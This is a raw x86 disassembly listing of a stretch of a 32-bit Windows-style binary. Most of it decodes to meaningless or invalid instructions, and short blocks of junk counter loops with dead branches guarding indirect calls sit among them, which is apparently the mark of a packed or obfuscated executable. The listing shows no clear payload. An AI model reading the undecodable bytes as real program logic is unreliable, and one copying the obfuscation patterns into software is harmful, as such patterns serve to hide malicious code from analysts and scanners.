  405c58:	sbb    al,cl
  405c5a:	test   BYTE PTR [ecx+0x30],0xdb
  405c5e:	dec    eax
  405c5f:	xor    BYTE PTR [edx+ecx*1],0x72
  405c63:	push   eax
  405c64:	call   0x56545bb3
  405c69:	inc    edx
  405c6a:	or     al,0x96
  405c6c:	add    DWORD PTR [edx],edi
  405c6e:	mov    cl,0x85
  405c70:	or     eax,0x95a7973c
  405c75:	ins    DWORD PTR es:[edi],dx
  405c76:	pop    edx
  405c77:	fcmovnu st,st(6)
  405c79:	ror    DWORD PTR [ebp+0x647ceace],1
  405c7f:	or     BYTE PTR [ecx-0x40b16f71],0xfd
  405c86:	enter  0x3b71,0x1e
  405c8a:	pop    ss
  405c8b:	xor    ecx,ebp
  405c8d:	lahf   
  405c8e:	rol    BYTE PTR [ebp+0x39c137e1],1
  405c94:	jmp    0xf409:0x671dd73
  405c9b:	pop    edx
  405c9c:	es pop edi
  405c9e:	add    al,BYTE PTR [ebp+0x629bec74]
  405ca4:	mov    edx,0x6356c1df
  405ca9:	out    dx,eax
  405caa:	mov    eax,ds:0x4441a0
  405caf:	mov    DWORD PTR [ebp-0x10],eax
  405cb2:	mov    eax,ds:0x4442ac
  405cb7:	sub    DWORD PTR ds:0x44d410,0x44a6cc
  405cc1:	mov    DWORD PTR [ebp-0x30],eax
  405cc4:	neg    eax
  405cc6:	mov    DWORD PTR [ebp-0xc],0xf89c8535
  405ccd:	adc    eax,DWORD PTR ds:0x424732
  405cd3:	mov    DWORD PTR [ebp-0x14],0xf89c8534
  405cda:	mov    eax,DWORD PTR [ebp-0xc]
  405cdd:	xor    DWORD PTR ds:0x44a6e0,0x59fc
  405ce7:	push   ebx
  405ce8:	or     DWORD PTR ds:0x424742,0x42473a
  405cf2:	push   esi
  405cf3:	adc    DWORD PTR ds:0x42473a,edi
  405cf9:	push   edi
  405cfa:	mov    DWORD PTR ds:0x44a6d4,0x13
  405d04:	cmp    DWORD PTR ds:0x44a6d4,0x0
  405d0b:	je     0x405e95
  405d11:	cmp    DWORD PTR ds:0x44a6d4,0x3
  405d18:	jne    0x405d31
  405d1e:	push   0x141c
  405d23:	push   0x6005
  405d28:	push   DWORD PTR [ebp-0xc]
  405d2b:	call   DWORD PTR ds:0x4420e0
  405d31:	cmp    DWORD PTR ds:0x44a6d4,0x4
  405d38:	jne    0x405d4d
  405d3e:	xor    edi,edi
  405d40:	xor    edi,DWORD PTR ds:0x44a6d4
  405d46:	dec    edi
  405d47:	mov    DWORD PTR ds:0x44a6d4,edi
  405d4d:	mov    edi,DWORD PTR ds:0x44a6d4
  405d53:	dec    edi
  405d54:	mov    DWORD PTR ds:0x44a6d4,edi
  405d5a:	jmp    0x405d04
  405d5f:	and    DWORD PTR ds:0x447988,0x5029
  405d69:	jmp    0x405e95
  405d6e:	out    0xd6,eax
  405d70:	(bad)  
  405d71:	sub    al,0xf9
  405d73:	sub    al,0xf9
  405d75:	jmp    0x592bcf2a
  405d7a:	ficomp DWORD PTR [ebp-0x65]
  405d7d:	add    edx,DWORD PTR [ecx+0xd7c7c21]
  405d83:	jg     0x405e01
  405d85:	jl     0x405d93
  405d87:	mov    edi,0xc185554d
  405d8c:	inc    edi
  405d8d:	adc    al,0xad
  405d8f:	and    DWORD PTR ds:0xec6ed5c7,0x10
  405d96:	cli    
  405d97:	pop    esi
  405d98:	lods   eax,DWORD PTR ds:[esi]
  405d99:	ret    0x1941
  405d9c:	xor    al,BYTE PTR [ebx-0x5b]
  405d9f:	sub    bl,ah
  405da1:	jno    0x405de7
  405da3:	ins    BYTE PTR es:[edi],dx
  405da4:	sbb    DWORD PTR [edx+eiz*4-0x38],edi
  405da8:	dec    esi
  405da9:	imul   edi,DWORD PTR [eax+0x24],0x30235277
  405db0:	pop    eax
  405db1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405db2:	push   ebp
  405db3:	inc    ebx
  405db4:	std    
  405db5:	call   0x8327:0x70e101f4
  405dbc:	in     eax,0x58
  405dbe:	shl    DWORD PTR [esi],1
  405dc0:	xchg   esp,eax
  405dc1:	mov    al,0xcf
  405dc3:	sub    DWORD PTR [eax],0xffffffc3
  405dc6:	cmp    al,BYTE PTR [ebp-0xa749e9e]
  405dcc:	or     BYTE PTR [esi+0x25],ah
  405dcf:	xor    eax,0xad1a73f7
  405dd4:	test   al,0x80
  405dd6:	sbb    BYTE PTR [esi-0x6eda9c01],0xab
  405ddd:	enter  0x2528,0x12
  405de1:	mov    ds:0x2af9cf72,eax
  405de6:	and    DWORD PTR [ebp+0x65],esi
  405de9:	jno    0x405dce
  405deb:	cmp    DWORD PTR [edx-0xb630863],ebx
  405df1:	cmp    DWORD PTR [bx+di],eax
  405df4:	mov    dh,0x4f
  405df6:	(bad)  
  405df7:	xchg   edi,eax
  405df8:	mul    DWORD PTR [eax+0x2c7536b1]
  405dfe:	mov    al,0xa6
  405e00:	(bad)  [esi+0x38]
  405e03:	jle    0x405e6c
  405e05:	push   esi
  405e06:	fsubrp st(4),st
  405e08:	mov    ah,0xdf
  405e0a:	pop    ds
  405e0b:	(bad)  
  405e0d:	sar    DWORD PTR ds:[ecx],1
  405e10:	call   0x51fe7a45
  405e15:	add    al,0x25
  405e17:	lods   eax,DWORD PTR ds:[esi]
  405e18:	mov    al,ds:0x773bd39b
  405e1d:	loope  0x405e47
  405e1f:	xor    bl,BYTE PTR [esp+esi*4-0x4797adc0]
  405e26:	fwait
  405e27:	or     BYTE PTR [eax+0x4c],bh
  405e2a:	jb     0x405e79
  405e2c:	pop    esi
  405e2d:	arpl   WORD PTR [bp+si],sp
  405e30:	jmp    FWORD PTR [esi]
  405e32:	in     al,0x5e
  405e34:	sbb    al,0xe4
  405e36:	stos   BYTE PTR es:[edi],al
  405e37:	mov    dh,0xcb
  405e39:	imul   ecx,DWORD PTR [edi+0x5c9f2615],0xfffffff1
  405e40:	(bad)  
  405e41:	fiadd  DWORD PTR [eax]
  405e43:	fldcw  WORD PTR [esi+0xe85f659]
  405e49:	loope  0x405dfc
  405e4b:	out    0x65,al
  405e4d:	(bad)  
  405e4e:	cdq    
  405e4f:	mov    ss,WORD PTR [ebx+0x5e]
  405e52:	and    DWORD PTR [eiz*8+0x1cc2855a],edx
  405e59:	pop    edx
  405e5a:	mov    edx,0xf0bb24e0
  405e5f:	scas   al,BYTE PTR es:[edi]
  405e60:	stos   DWORD PTR es:[edi],eax
  405e61:	out    dx,al
  405e62:	mov    BYTE PTR [ecx-0x6],0x8b
  405e66:	jl     0x405eb7
  405e68:	jne    0x405ea2
  405e6a:	out    dx,eax
  405e6b:	push   esp
  405e6c:	in     al,dx
  405e6d:	fiadd  WORD PTR [ebx]
  405e6f:	mov    ecx,0x248b3509
  405e74:	call   0x54ce:0xb5451367
  405e7b:	mov    al,ds:0x20d289f
  405e80:	pop    es
  405e81:	push   edi
  405e82:	push   edi
  405e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e84:	and    al,0x8c
  405e86:	dec    ebx
  405e87:	mov    cs,WORD PTR [ebx]
  405e89:	mov    esp,0x79de0d99
  405e8e:	loope  0x405e10
  405e90:	je     0x405ea3
  405e92:	mov    eax,0x57be84d3
  405e97:	or     BYTE PTR [ecx+0x7],dl
  405e9a:	xor    eax,esi
  405e9c:	movzx  edi,WORD PTR ds:0x410753
  405ea3:	xor    DWORD PTR ds:0x447980,edi
  405ea9:	mov    edi,0x32729e
  405eae:	jmp    0x405fda
  405eb3:	icebp  
  405eb4:	popa   
  405eb5:	jno    0x405f2b
  405eb7:	loope  0x405f1d
  405eb9:	mov    DWORD PTR [ecx-0x35],edi
  405ebc:	add    esi,DWORD PTR [esi+0x2d]
  405ebf:	out    dx,eax
  405ec0:	lea    edx,[edi-0xd]
  405ec3:	scas   al,BYTE PTR es:[edi]
  405ec4:	and    BYTE PTR [esp+edi*2+0xd],bh
  405ec8:	jg     0x405f46
  405eca:	jl     0x405f28
  405ecc:	fidivr DWORD PTR [edx-0x25]
  405ecf:	inc    edi
  405ed0:	out    0x1f,al
  405ed2:	(bad)  
  405ed3:	dec    edx
  405ed4:	add    al,BYTE PTR [ebx+0x2d]
  405ed7:	arpl   WORD PTR [edx+eax*1+0x61],dx
  405edb:	pop    ss
  405edc:	ins    DWORD PTR es:[edi],dx
  405edd:	mov    ecx,0x4e26e2d5
  405ee2:	jmp    0x405eca
  405ee4:	push   ebx
  405ee5:	and    al,bh
  405ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ee8:	cmp    BYTE PTR [esi-0x4ee1dfe8],al
  405eee:	or     eax,DWORD PTR [ebx+eax*4+0x3e]
  405ef2:	inc    esi
  405ef3:	ss mov bl,0x2
  405ef6:	jmp    0x86e630ed
  405efb:	outs   dx,DWORD PTR ds:[esi]
  405efc:	ss push ss
  405efe:	lds    ebx,FWORD PTR [edi-0x1727b8da]
  405f04:	or     ch,ah
  405f06:	jl     0x405f4b
  405f08:	push   0x22
  405f0a:	mov    ebx,0xc058faac
  405f0f:	rol    BYTE PTR [edx+0xec047ce],cl
  405f15:	fidivr WORD PTR [ebx]
  405f17:	ins    DWORD PTR es:[edi],dx
  405f18:	pop    ebp
  405f19:	(bad)  
  405f1b:	push   eax
  405f1c:	shl    cl,cl
  405f1e:	jge    0x405f03
  405f20:	or     eax,0x478d1b85
  405f25:	in     eax,0xa1
  405f27:	ins    BYTE PTR es:[edi],dx
  405f28:	jo     0x405f7d
  405f2a:	cdq    
  405f2b:	sbb    al,0x5e
  405f2d:	adc    DWORD PTR [ebp-0x7385d16a],ebp
  405f33:	aad    0x8d
  405f35:	and    eax,0x45787f41
  405f3a:	cmp    BYTE PTR [edx],0x3a
  405f3d:	das    
  405f3e:	inc    edx
  405f3f:	dec    ebp
  405f40:	adc    dl,BYTE PTR [ebx+0xf]
  405f43:	scas   eax,DWORD PTR es:[edi]
  405f44:	in     eax,0xa9
  405f46:	and    DWORD PTR [eax],ebx
  405f48:	mov    dl,0xc3
  405f4a:	fidiv  WORD PTR [esi-0x17]
  405f4d:	lods   al,BYTE PTR ds:[esi]
  405f4e:	mov    edx,0xc92cd74a
  405f53:	mov    ch,0x1b
  405f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f56:	stos   DWORD PTR es:[edi],eax
  405f57:	sbb    eax,0xa6116a58
  405f5c:	sahf   
  405f5d:	push   ss
  405f5e:	dec    ecx
  405f5f:	xchg   edx,eax
  405f60:	stc    
  405f61:	dec    ebx
  405f62:	adc    ah,cl
  405f64:	fbstp  TBYTE PTR [ebx+0x56e0215e]
  405f6a:	mov    ds:0x2ba81cf7,al
  405f6f:	adc    al,0xb1
  405f71:	xlat   BYTE PTR ds:[ebx]
  405f72:	dec    ebp
  405f73:	inc    ebp
  405f74:	xor    al,0xa1
  405f76:	mov    eax,ds:0xc8fefa75
  405f7b:	or     edx,0xffffff9d
  405f7e:	call   0xdc4b:0x79166e4b
  405f85:	out    0xfd,al
  405f87:	out    dx,al
  405f88:	pop    esp
  405f89:	adc    DWORD PTR [esi+0x3d],ebp
  405f8c:	cmp    esi,DWORD PTR [eax+0x62b7cda4]
  405f92:	sbb    bh,BYTE PTR [esi+ebp*8+0x3f3a8eee]
  405f99:	(bad)  
  405f9a:	cmp    al,0x94
  405f9c:	sub    cl,BYTE PTR [esi-0x3e]
  405f9f:	mov    gs,WORD PTR [esi-0x5e]
  405fa2:	and    eax,0xccb5ce9c
  405fa7:	mov    ebp,?
  405fa9:	mov    eax,ds:0x77858f56
  405fae:	mov    bh,0xca
  405fb0:	inc    esp
  405fb1:	(bad)  
  405fb2:	pop    esi
  405fb3:	fcmovbe st,st(5)
  405fb5:	pop    ebx
  405fb6:	loop   0x405f74
  405fb8:	mov    ecx,0xc37508f3
  405fbd:	ins    BYTE PTR es:[edi],dx
  405fbe:	icebp  
  405fbf:	ret    
  405fc0:	pushf  
  405fc1:	or     BYTE PTR [esp+eax*4+0x12063335],al
  405fc8:	ins    BYTE PTR es:[edi],dx
  405fc9:	iret   
  405fca:	xchg   DWORD PTR [ebx+0x22b77b56],ebp
  405fd0:	mov    dl,0xf9
  405fd2:	adc    al,0x54
  405fd4:	retf   0x3510
  405fd7:	add    eax,0xc7032e08
  405fdc:	mov    DWORD PTR [ebp-0x20],eax
  405fdf:	mov    DWORD PTR ds:0x424736,0x15
  405fe9:	cmp    DWORD PTR ds:0x424736,0x0
  405ff0:	je     0x406021
  405ff6:	cmp    DWORD PTR ds:0x424736,0x23
  405ffd:	jne    0x40600e
  406003:	push   0x410927
  406008:	call   DWORD PTR ds:0x4420e4
  40600e:	xor    eax,eax
  406010:	or     eax,DWORD PTR ds:0x424736
  406016:	dec    eax
  406017:	mov    ds:0x424736,eax
  40601c:	jmp    0x405fe9
  406021:	mov    DWORD PTR [ebp-0x28],0xf89cb535
  406028:	mov    DWORD PTR [ebp-0x34],0xf89f0535
  40602f:	mov    DWORD PTR ds:0x447994,0x1696
  406039:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  406040:	or     DWORD PTR ds:0x44a6e0,edx
  406046:	mov    DWORD PTR [ebp-0x24],0xf89c85d5
  40604d:	and    DWORD PTR ds:0x410743,0x0
  406057:	jmp    0x40606a
  40605c:	xor    eax,eax
  40605e:	xor    eax,DWORD PTR ds:0x410743
  406064:	inc    eax
  406065:	mov    ds:0x410743,eax
  40606a:	cmp    DWORD PTR ds:0x410743,0x1c
  406071:	jae    0x4060ad
  406077:	cmp    DWORD PTR ds:0x410743,0x2b
  40607e:	jne    0x4060a3
  406084:	push   0x78a8
  406089:	push   0x44a6e0
  40608e:	push   0x8180
  406093:	push   0x6239
  406098:	push   0x1782
  40609d:	call   DWORD PTR ds:0x442364
  4060a3:	jmp    0x40605c
  4060a8:	xor    eax,0x3639
  4060ad:	mov    eax,DWORD PTR [ebp-0xc]
  4060b0:	add    DWORD PTR ds:0x4479a4,0x2d0a
  4060ba:	xor    eax,esi
  4060bc:	sbb    DWORD PTR ds:0x424726,0x6315
  4060c6:	add    eax,edi
  4060c8:	mov    DWORD PTR [ebp-0x18],eax
  4060cb:	or     DWORD PTR ds:0x44d414,0x658e
  4060d5:	mov    DWORD PTR [ebp-0x1c],0xf89c8530
  4060dc:	mov    BYTE PTR [ebp-0x1],0x57
  4060e0:	or     DWORD PTR ds:0x447994,edi
  4060e6:	mov    eax,DWORD PTR [ebp-0xc]
  4060e9:	xor    eax,esi
  4060eb:	add    eax,edi
  4060ed:	sbb    DWORD PTR ds:0x410753,0x34b4
  4060f7:	mov    DWORD PTR [ebp-0x18],eax
  4060fa:	dec    DWORD PTR ds:0x447998
  406100:	mov    eax,DWORD PTR [ebp-0x24]
  406103:	xor    eax,esi
  406105:	adc    DWORD PTR ds:0x41074b,0x44798c
  40610f:	add    eax,edi
  406111:	xor    DWORD PTR ds:0x447994,0x44d420
  40611b:	push   eax
  40611c:	mov    eax,DWORD PTR [ebp-0x28]
  40611f:	xor    eax,esi
  406121:	sbb    DWORD PTR ds:0x44799c,0x1e41
  40612b:	add    eax,edi
  40612d:	xor    DWORD PTR ds:0x447994,0x44d424
  406137:	push   eax
  406138:	and    DWORD PTR ds:0x41073f,0x0
  406142:	mov    eax,ds:0x41073f
  406147:	inc    eax
  406148:	mov    ds:0x41073f,eax
  40614d:	cmp    DWORD PTR ds:0x41073f,0xc
  406154:	jne    0x406170
  40615a:	push   0x8a0b
  40615f:	push   0x44a6d0
  406164:	push   DWORD PTR [ebp-0x28]
  406167:	push   DWORD PTR [ebp-0x20]
  40616a:	call   DWORD PTR ds:0x4420e8
  406170:	cmp    DWORD PTR ds:0x41073f,0xb
  406177:	jne    0x40618b
  40617d:	xor    eax,eax
  40617f:	add    eax,DWORD PTR ds:0x41073f
  406185:	inc    eax
  406186:	mov    ds:0x41073f,eax
  40618b:	cmp    DWORD PTR ds:0x41073f,0x17
  406192:	jb     0x406142
  406198:	movzx  eax,BYTE PTR ds:0x42472e
  40619f:	xor    DWORD PTR ds:0x44a6d8,eax
  4061a5:	mov    eax,DWORD PTR [ebp-0x1c]
  4061a8:	neg    DWORD PTR ds:0x424736
  4061ae:	xor    eax,esi
  4061b0:	add    eax,edi
  4061b2:	or     DWORD PTR ds:0x44a6d8,0x41073f
  4061bc:	jmp    0x4062e8
  4061c1:	sar    DWORD PTR [ebp+0x7d793df9],cl
  4061c7:	sar    DWORD PTR [ebp+0x7a],cl
  4061ca:	sub    eax,0x40a9f1da
  4061cf:	push   ebp
  4061d0:	xor    bh,BYTE PTR [edi+0xd7c7c23]
  4061d6:	jg     0x406254
  4061d8:	jl     0x40621b
  4061da:	lock push esp
  4061dc:	cmp    ecx,DWORD PTR [edi]
  4061de:	lds    esi,FWORD PTR [edi-0x4]
  4061e1:	lahf   
  4061e2:	aaa    
  4061e3:	mov    esi,0x98501efa
  4061e8:	mov    WORD PTR [edx+eax*1+0x18711abd],fs
  4061ef:	or     DWORD PTR [ebp+0x62c26a0a],0xffffff98
  4061f6:	sahf   
  4061f7:	loopne 0x4061ca
  4061f9:	inc    esp
  4061fa:	cmp    eax,0x1109aa02
  4061ff:	pop    ecx
  406200:	lahf   
  406201:	push   es
  406202:	imul   ebp,DWORD PTR fs:[ebx+ebx*4+0x6c7094cc],0xcfd3ec47
  40620e:	pushf  
  40620f:	sub    ah,BYTE PTR [ebx]
  406211:	push   eax
  406212:	ds das 
  406214:	mov    edx,DWORD PTR [edi]
  406216:	out    0x74,eax
  406218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406219:	dec    edi
  40621a:	mov    bl,ch
  40621c:	stc    
  40621d:	sbb    BYTE PTR [eax],bh
  40621f:	loope  0x4061f2
  406221:	jo     0x406228
  406223:	ins    DWORD PTR es:[edi],dx
  406224:	pushf  
  406225:	jns    0x406236
  406227:	cdq    
  406228:	sbb    DWORD PTR [edi-0x77],esi
  40622b:	dec    esp
  40622c:	lock pop ebx
  40622e:	daa    
  40622f:	or     dh,BYTE PTR [ebp-0x17f6a154]
  406235:	call   0xd914f0db
  40623a:	repnz cmp dl,BYTE PTR [ebx+0x35]
  40623e:	ds icebp 
  406240:	mov    edx,0x1359af15
  406245:	leave  
  406246:	leave  
  406247:	or     al,BYTE PTR [ebx-0x53]
  40624a:	test   BYTE PTR [ebx-0x6d],bl
  40624d:	pop    es
  40624e:	leave  
  40624f:	add    edi,ebx
  406251:	fild   WORD PTR [ebp-0x48]
  406254:	xchg   cl,al
  406256:	das    
  406257:	xlat   BYTE PTR ds:[ebx]
  406258:	inc    esi
  406259:	sub    BYTE PTR [eax],ch
  40625b:	add    edx,DWORD PTR [ebp-0x22bcda68]
  406261:	jecxz  0x40624d
  406263:	lods   eax,DWORD PTR ds:[esi]
  406264:	push   eax
  406265:	(bad)  
  406266:	adc    bl,BYTE PTR [ecx+0x4b]
  406269:	xchg   ecx,eax
  40626a:	cmp    bl,ah
  40626c:	xor    DWORD PTR [eax-0x424b6b94],0x1c0ed242
  406276:	out    dx,eax
  406277:	ret    
  406278:	mov    ebp,0xe978040f
  40627d:	dec    ebx
  40627e:	or     al,0xb1
  406280:	nop
  406281:	or     al,0x97
  406283:	jno    0x406290
  406285:	mov    bl,0x73
  406287:	adc    BYTE PTR [ebx+0x47f22cbd],ah
  40628d:	sub    al,0x8f
  40628f:	adc    eax,0x3c42d56c
  406294:	cmp    ah,ah
  406296:	sti    
  406297:	inc    ebp
  406298:	inc    ebp
  406299:	jnp    0x40623f
  40629b:	sub    ch,BYTE PTR [eax+0x6d]
  40629e:	and    al,0x5
  4062a0:	das    
  4062a1:	jmp    0xb89e:0xb088474b
  4062a8:	pop    ebx
  4062a9:	inc    BYTE PTR [eax-0x53324d63]
  4062af:	test   BYTE PTR [edx],dh
  4062b1:	add    eax,0x47e16fd5
  4062b6:	int    0x6
  4062b8:	in     eax,0xfe
  4062ba:	call   0xdc17:0xca91f5b5
  4062c1:	mov    bh,0xb5
  4062c3:	pop    eax
  4062c4:	dec    esi
  4062c5:	retf   0xbe7e
  4062c8:	dec    esi
  4062c9:	ret    0xbcef
  4062cc:	(bad)  
  4062cd:	std    
  4062ce:	popa   
  4062cf:	fdivp  st(6),st
  4062d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062d2:	inc    esp
  4062d3:	push   edx
  4062d4:	pop    esp
  4062d5:	push   ss
  4062d6:	cmc    
  4062d7:	cwde   
  4062d8:	std    
  4062d9:	jp     0x406351
  4062db:	or     al,0xa5
  4062dd:	mov    ds:0x21893173,al
  4062e2:	push   ebp
  4062e3:	add    ebx,0x42
  4062e6:	mov    eax,ds:0x458d50b1
  4062eb:	mov    BYTE PTR [ecx+0x44d41005],al
  4062f1:	add    BYTE PTR [eax],bl
  4062f3:	aam    0x44
  4062f5:	add    BYTE PTR [eax-0x7f],dl
  4062f8:	or     eax,0x4479a4
  4062fd:	xor    al,BYTE PTR [edi+0x42]
  406300:	add    bh,bh
  406302:	jne    0x4062f8
  406304:	add    DWORD PTR ds:0x44a6cc,0x42473a
  40630e:	jmp    0x40643a
  406313:	push   edx
  406314:	repz fist WORD PTR [ebp-0x4cadaa2f]
  40631b:	adc    DWORD PTR [esi-0x7f29cf51],esp
  406321:	cs xchg ebx,eax
  406323:	dec    esp
  406324:	and    bh,BYTE PTR [esp+edi*2+0xd]
  406328:	jg     0x4063a6
  40632a:	jl     0x4063a5
  40632c:	sbb    eax,0xdd6a7f0e
  406331:	adc    al,0x67
  406333:	sahf   
  406334:	mov    ah,0x22
  406336:	fldenv [ebx-0x2694c756]
  40633c:	fs in  eax,0xa4
  40633f:	mov    al,0xeb
  406341:	push   esi
  406342:	mov    eax,ds:0xcff160ae
  406347:	dec    edx
  406348:	xchg   edx,eax
  406349:	scas   al,BYTE PTR es:[edi]
  40634a:	aaa    
  40634b:	aaa    
  40634c:	cld    
  40634d:	inc    ecx
  40634e:	push   eax
  40634f:	mov    bl,0x23
  406351:	add    eax,0x553bf87b
  406356:	(bad)  
  406357:	lods   al,BYTE PTR ds:[esi]
  406358:	loopne 0x406302
  40635a:	sbb    edx,DWORD PTR es:[edx+0x61c9de68]
  406361:	inc    edx
  406362:	mov    edx,0x2352d2a1
  406367:	inc    ebx
  406368:	jmp    0x1f4e:0x77d3d62c
  40636f:	mov    DWORD PTR [ebx+0x4feafbaa],ecx
  406375:	push   eax
  406376:	out    0xdb,eax
  406378:	pop    ds
  406379:	mov    eax,DWORD PTR [ebx]
  40637b:	out    dx,al
  40637c:	mov    dl,0xf3
  40637e:	or     dh,cl
  406380:	pop    es
  406381:	test   BYTE PTR [esi-0x3e],ah
  406384:	test   BYTE PTR [ebp+0x5f],al
  406387:	jne    0x4063cb
  406389:	jo     0x40639a
  40638b:	mov    dh,0x4e
  40638d:	fnstsw WORD PTR [edx-0x53]
  406390:	mov    bl,0x38
  406392:	in     eax,dx
  406393:	or     cl,BYTE PTR [eax-0x444bc37b]
  406399:	gs repz test eax,0x8d32a829
  4063a0:	sub    DWORD PTR [edx],esp
  4063a2:	ror    DWORD PTR [ebp-0x296645c7],1
  4063a8:	push   DWORD PTR [edi+0x753ac0e7]
  4063ae:	lds    ebx,FWORD PTR [ebx-0x7fbfc3c7]
  4063b4:	(bad)  
  4063b5:	dec    esp
  4063b6:	mov    esp,0x6d74fc0e
  4063bb:	push   cs
  4063bc:	or     al,0xb0
  4063be:	sahf   
  4063bf:	adc    esi,DWORD PTR [ecx]
  4063c1:	(bad)  
  4063c3:	dec    ebx
  4063c4:	sub    ch,BYTE PTR [edi]
  4063c6:	mov    ds:0x55780fe0,al
  4063cb:	sub    al,0xaa
  4063cd:	std    
  4063ce:	sub    al,0x1e
  4063d0:	push   ebx
  4063d1:	fld    TBYTE PTR [ebx]
  4063d3:	dec    esi
  4063d4:	sub    BYTE PTR ds:0xaec883c2,dl
  4063da:	hlt    
  4063db:	inc    edi
  4063dc:	adc    BYTE PTR [edx+edx*1+0x1d],ah
  4063e0:	add    BYTE PTR [edx],al
  4063e2:	push   ds
  4063e3:	daa    
  4063e4:	cs push esi
  4063e6:	mov    ebp,DWORD PTR [ebx]
  4063e8:	add    eax,0x41bafb87
  4063ed:	adc    al,0xd3
  4063ef:	xor    eax,0xc00aa651
  4063f4:	and    eax,0x3c432d4f
  4063f9:	mov    bl,BYTE PTR [esi-0x5e65a635]
  4063ff:	popa   
  406400:	rol    esp,1
  406402:	popa   
  406403:	cmp    ecx,ebp
  406405:	(bad)  
  406406:	add    edx,DWORD PTR [eax-0x74]
  406409:	(bad)  
  40640a:	aam    0xc
  40640c:	jmp    0x40644b
  40640e:	aam    0x88
  406410:	(bad)  
  406412:	out    0x1f,eax
  406414:	ja     0x4063f9
  406416:	mov    ecx,0x3758616c
  40641b:	adc    DWORD PTR [edx+0x7dc60420],0x53703c54
  406425:	sub    eax,0x6d4dd5df
  40642a:	sahf   
  40642b:	and    edi,DWORD PTR [eax-0x35]
  40642e:	fld    QWORD PTR [edi+0x24b7ed06]
  406434:	lahf   
  406435:	shl    DWORD PTR [esi-0x5],cl
  406438:	call   0x27e9:0xec75ff71
  40643f:	add    DWORD PTR [eax],eax
  406441:	add    BYTE PTR [esi+0x652662a7],al
  406447:	std    
  406448:	pop    edx
  406449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40644a:	inc    eax
  40644b:	adc    al,0x79
  40644d:	sub    al,0x9b
  40644f:	ror    DWORD PTR [edi-0x22],1
  406452:	pop    ebp
  406453:	and    eax,0x7f0d7c7c
  406458:	jl     0x4064d6
  40645a:	ja     0x40641f
  40645c:	dec    ecx
  40645d:	xchg   DWORD PTR [ecx-0x2b],ebp
  406460:	ret    0x1889
  406463:	(bad)  
  406464:	xlat   BYTE PTR ds:[ebx]
  406465:	mov    bl,0xa0
  406467:	(bad)
  40646a:	add    BYTE PTR [esi+0x4e37e7be],cl
  406470:	push   ss
  406471:	dec    ebp
  406472:	pop    ecx
  406473:	jb     0x4063fb
  406475:	xchg   dh,dl
  406477:	cmp    esi,ebx
  406479:	add    edx,ebp
  40647b:	jae    0x406409
  40647d:	cmp    ecx,DWORD PTR ds:0x288dc403
  406483:	cmp    ecx,esp
  406485:	rol    BYTE PTR [edx],1
  406487:	cmp    ch,BYTE PTR [eax]
  406489:	fidiv  WORD PTR [eax+0x2f]
  40648c:	sub    BYTE PTR [ecx+ebp*1-0x7c85ab74],al
  406493:	stos   BYTE PTR es:[edi],al
  406494:	stos   BYTE PTR es:[edi],al
  406495:	push   esi
  406496:	rcl    BYTE PTR [edx+0x2e005b79],cl
  40649c:	xchg   esi,eax
  40649d:	inc    ebp
  40649e:	pop    ds
  40649f:	adc    DWORD PTR [edi],esp
  4064a1:	imul   ebp,DWORD PTR [ecx+0x3746d639],0xa
  4064a8:	or     DWORD PTR [eax+0x67a90154],eax
  4064ae:	xor    BYTE PTR [esi+ebp*8],0x76
  4064b2:	adc    BYTE PTR [ecx+0x5d],dh
  4064b5:	std    
  4064b6:	xchg   edi,eax
  4064b7:	push   ecx
  4064b8:	test   eax,0x41dd457
  4064bd:	fmul   DWORD PTR [ebp-0x616e3558]
  4064c4:	jle    0x4064e0
  4064c6:	lock mov esp,0xcb545d14
  4064cc:	push   esi
  4064cd:	enter  0x52da,0x6
  4064d1:	mov    gs,WORD PTR [ecx+0x14a064ef]
  4064d7:	dec    ecx
  4064d8:	push   ebp
  4064d9:	add    al,0x54
  4064db:	cmp    al,0xe
  4064dd:	aas    
  4064de:	adc    cl,BYTE PTR [edi]
  4064e0:	push   cs
  4064e1:	push   ss
  4064e2:	ins    BYTE PTR es:[edi],dx
  4064e3:	sub    cl,BYTE PTR [esi]
  4064e5:	mov    ebx,0x9f72c01d
  4064ea:	jb     0x4064d3
  4064ec:	outs   dx,BYTE PTR ds:[esi]
  4064ed:	pop    esp
  4064ee:	cmc    
  4064ef:	je     0x406550
  4064f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064f2:	mov    dl,0x2e
  4064f4:	sub    edx,eax
  4064f6:	loope  0x4064b1
  4064f8:	cdq    
  4064f9:	inc    ebp
  4064fa:	shl    BYTE PTR [edi+esi*4],1
  4064fd:	test   eax,0x24a12025
  406502:	xor    bh,BYTE PTR [ebx]
  406504:	jge    0x4064e8
  406506:	dec    ecx
  406507:	addr16 dec esi
  406509:	sbb    DWORD PTR [esi+0x10],edx
  40650c:	lock lods al,BYTE PTR ds:[esi]
  40650e:	int3   
  40650f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406510:	dec    edi
  406511:	idiv   DWORD PTR [edi+0x60]
  406514:	shl    DWORD PTR ds:0xfe5bd0fa,1
  40651a:	aad    0x79
  40651c:	rcl    ebp,0xb1
  40651f:	mov    al,ds:0x93528044
  406524:	or     edi,DWORD PTR [esi+0x3d]
  406527:	aaa    
  406528:	retf   0x492c
  40652b:	jae    0x40655f
  40652d:	push   ebx
  40652e:	mov    ah,0xea
  406530:	ja     0x4065ab
  406532:	shl    DWORD PTR [esi+0x54],cl
  406535:	js     0x406571
  406537:	jmp    0x8ffc:0xa098e4fb
  40653e:	pop    edi
  40653f:	mov    ds:0x5004611a,al
  406544:	mov    ds:0x3dead702,al
  406549:	sbb    al,0x16
  40654b:	sbb    eax,0x2531b0b3
  406550:	js     0x406541
  406552:	xor    dh,BYTE PTR ds:0x4b8e880e
  406558:	mov    ebx,0xd02411b3
  40655d:	bound  ebp,QWORD PTR [eax]
  40655f:	mov    BYTE PTR [eax-0x1df8c832],ch
  406565:	xchg   ebx,eax
  406566:	or     eax,0xb2e88e25
  40656b:	jmp    0x40656c
  40656d:	inc    DWORD PTR [ebp-0x497bf040]
  406573:	add    eax,DWORD PTR [eax]
